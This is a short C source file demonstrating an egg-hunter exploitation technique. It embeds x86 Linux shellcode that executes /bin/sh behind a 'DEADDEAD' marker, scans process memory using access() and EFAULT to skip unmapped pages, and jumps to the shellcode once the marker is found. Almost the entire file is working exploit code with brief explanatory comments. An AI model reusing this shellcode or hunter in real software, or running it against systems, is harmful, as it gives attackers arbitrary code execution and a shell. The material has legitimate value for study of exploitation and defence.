#include <errno.h>
#include <stdio.h>
#include <unistd.h>

int main()
{
	char egg[4] = "DEAD";
	char buffer[1024] = "DEADDEAD\xeb\x1a\x5e\x31\xdb\x88\x5e\x07\x89\x76\x08\x89\x5e\x0c\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\x31\xc0\xb0\x0b\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43";	
	unsigned long addr = 0x0;
	int r;

	while (1) {
		// Try to read 8 bytes ahead of current memory pointer
		r = access(addr+8, 0);
		// If we don't get an EFAULT, we'll start checking for the egg
		if (errno != 14) {
			// Need to check egg twice, so we don't end up matching the egg from our own code
			if (strncmp(addr, egg, 4) == 0 && strncmp(addr+4, egg, 4) == 0) {
				char tmp[32];
				memset(tmp, 0, 32);
				strncpy(tmp, addr, 8);
				printf("Egg found at: %ul %s, jumping to shellcode (8 bytes ahead of egg address)...\n", addr, tmp);
				// Jump to shellcode
				int (*ret)() = (int(*)())addr+8;
				ret();
			}
			// Egg not found, keep going one byte at a time
			addr++;
        } else {
			// EFAULT on access, skip to next memory page
			addr = addr + 4095;
		}
	}
}
